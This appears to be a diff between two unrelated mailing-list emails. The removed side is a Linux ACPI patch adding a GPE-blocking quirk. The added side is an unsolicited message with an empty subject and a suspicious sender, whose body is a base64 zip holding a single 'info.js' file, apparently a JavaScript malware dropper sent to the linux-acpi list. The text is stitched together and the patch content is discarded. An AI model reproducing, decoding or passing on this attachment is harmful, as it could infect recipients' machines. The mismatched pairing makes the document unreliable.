@@ -1,149 +1,58 @@
-From: Lv Zheng <lv.zheng@intel.com>
-Subject: [PATCH 3/3] ACPI / sysfs: Provide quirk mechanism to prevent GPE flooding
-Date: Mon, 16 May 2016 17:11:24 +0800
-Message-ID: <c6808078a092fbf990d535cc359b734108ae5d6b.1463389640.git.lv.zheng@intel.com>
-References: <cover.1463389639.git.lv.zheng@intel.com>
+From: <kchristopher@framingham.edu>
+Subject: (unknown)
+Date: Sun, 16 May 2016 15:47:29 0000
+Message-ID: <000101d1af8a$408c1174$c0a80001@pu.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="5153960517661_linux-acpi.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from mga14.intel.com ([192.55.52.115]:62070 "EHLO mga14.intel.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1753299AbcEPJL2 (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
-	Mon, 16 May 2016 05:11:28 -0400
-In-Reply-To: <cover.1463389639.git.lv.zheng@intel.com>
+Received: from vlan586-172.net.pu.ru ([195.19.230.172]:52236 "HELO pu.ru"
+	rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+	id S1753326AbcEPJrd (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+	Mon, 16 May 2016 05:47:33 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: "Rafael J. Wysocki" <rafael.j.wysocki@intel.com>, "Rafael J. Wysocki" <rjw@rjwysocki.net>, Len Brown <len.brown@intel.com>
-Cc: Lv Zheng <lv.zheng@intel.com>, Lv Zheng <zetalog@gmail.com>, linux-kernel@vger.kernel.org, linux-acpi@vger.kernel.org
+To: linux-acpi <linux-acpi@vger.kernel.org>
 
-Sometimes, the users may require a quirk to be provided from ACPI subsystem
-core to prevent a GPE from flooding. Normally, if a GPE cannot be
-dispatched, ACPICA core automatically prevents the GPE from firing. But
-there are cases the GPE is dispatched by _Lxx/_Exx provided via AML table,
-and OSPM is lacking of the knowledge to get _Lxx/_Exx correctly executed to
-handle the GPE, thus the GPE flooding may still occur.
 
-This patch provides a quirk mechanism to stop this kind of GPE flooding.
 
-Link: https://bugzilla.kernel.org/show_bug.cgi?id=53071
-Link: https://bugs.launchpad.net/ubuntu/+source/linux/+bug/887793
-Signed-off-by: Lv Zheng <lv.zheng@intel.com>
----
- drivers/acpi/internal.h |    1 +
- drivers/acpi/scan.c     |    1 +
- drivers/acpi/sleep.c    |    2 ++
- drivers/acpi/sysfs.c    |   56 +++++++++++++++++++++++++++++++++++++++++++++++
- 4 files changed, 60 insertions(+)
-
-diff --git a/drivers/acpi/internal.h b/drivers/acpi/internal.h
-index 9bb0773..d0f1744 100644
---- a/drivers/acpi/internal.h
-+++ b/drivers/acpi/internal.h
-@@ -37,6 +37,7 @@ void acpi_amba_init(void);
- static inline void acpi_amba_init(void) {}
- #endif
- int acpi_sysfs_init(void);
-+void acpi_gpe_apply_blocked_gpes(void);
- void acpi_container_init(void);
- void acpi_memory_hotplug_init(void);
- #ifdef	CONFIG_ACPI_HOTPLUG_IOAPIC
-diff --git a/drivers/acpi/scan.c b/drivers/acpi/scan.c
-index 5f28cf7..5ff366c 100644
---- a/drivers/acpi/scan.c
-+++ b/drivers/acpi/scan.c
-@@ -1958,6 +1958,7 @@ int __init acpi_scan_init(void)
- 		}
- 	}
- 
-+	acpi_gpe_apply_blocked_gpes();
- 	acpi_update_all_gpes();
- 
-  out:
-diff --git a/drivers/acpi/sleep.c b/drivers/acpi/sleep.c
-index d00544c..daba3ba 100644
---- a/drivers/acpi/sleep.c
-+++ b/drivers/acpi/sleep.c
-@@ -414,6 +414,7 @@ static void acpi_pm_finish(void)
- 		acpi_state);
- 	acpi_disable_wakeup_devices(acpi_state);
- 	acpi_leave_sleep_state(acpi_state);
-+	acpi_gpe_apply_blocked_gpes();
- 
- 	/* reset firmware waking vector */
- 	acpi_set_waking_vector(0);
-@@ -774,6 +775,7 @@ static void acpi_pm_thaw(void)
- {
- 	acpi_ec_unblock_transactions();
- 	acpi_enable_all_runtime_gpes();
-+	acpi_gpe_apply_blocked_gpes();
- }
- 
- static const struct platform_hibernation_ops acpi_hibernation_ops = {
-diff --git a/drivers/acpi/sysfs.c b/drivers/acpi/sysfs.c
-index 7f33c90..a2fb524 100644
---- a/drivers/acpi/sysfs.c
-+++ b/drivers/acpi/sysfs.c
-@@ -715,6 +715,62 @@ end:
- 	return result ? result : size;
- }
- 
-+/*
-+ * A Quirk Mechanism for GPE Flooding Prevention:
-+ *
-+ * Quirks may be needed to prevent GPE flooding on a specific GPE. The
-+ * flooding typically cannot be detected and automatically prevented by
-+ * ACPI_GPE_DISPATCH_NONE check because there is a _Lxx/_Exx prepared in
-+ * the AML tables. This normally indicates a feature gap in Linux, thus
-+ * instead of providing endless quirk tables, we provide a boot parameter
-+ * for those who want this quirk. For example, if the users want to prevent
-+ * the GPE flooding for GPE 00, they need to specify the following boot
-+ * parameter:
-+ *   acpi.block_gpe=0x00
-+ * The blocking status can be modified by the following runtime controlling
-+ * interface:
-+ *   echo unblock > /sys/firmware/acpi/interrupts/gpe00
-+ */
-+
-+/*
-+ * Currently, the GPE flooding prevention only supports to block the GPEs
-+ * numbered from 00 to 63.
-+ */
-+#define ACPI_BLOCKABLE_GPE_MAX	64
-+
-+static u64 acpi_blocked_gpes;
-+
-+static int __init acpi_gpe_set_blocked_gpes(char *val)
-+{
-+	u8 gpe;
-+
-+	if (kstrtou8(val, 0, &gpe) || gpe > ACPI_BLOCKABLE_GPE_MAX)
-+		return -EINVAL;
-+	acpi_blocked_gpes |= ((u64)1<<gpe);
-+
-+	return 1;
-+}
-+__setup("acpi_block_gpe=", acpi_gpe_set_blocked_gpes);
-+
-+void acpi_gpe_apply_blocked_gpes(void)
-+{
-+	acpi_handle handle;
-+	acpi_status status;
-+	u8 gpe;
-+
-+	for (gpe = 0;
-+	     gpe < min_t(u8, ACPI_BLOCKABLE_GPE_MAX, acpi_current_gpe_count);
-+	     gpe++) {
-+		if (acpi_blocked_gpes & ((u64)1<<gpe)) {
-+			status = acpi_get_gpe_device(gpe, &handle);
-+			if (ACPI_SUCCESS(status)) {
-+				pr_info("Blocking GPE 0x%x.\n", gpe);
-+				(void)acpi_block_gpe(handle, gpe);
-+			}
-+		}
-+	}
-+}
-+
- void acpi_irq_stats_init(void)
- {
- 	acpi_status status;
--- 
-1.7.10
-
+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
+AAAA
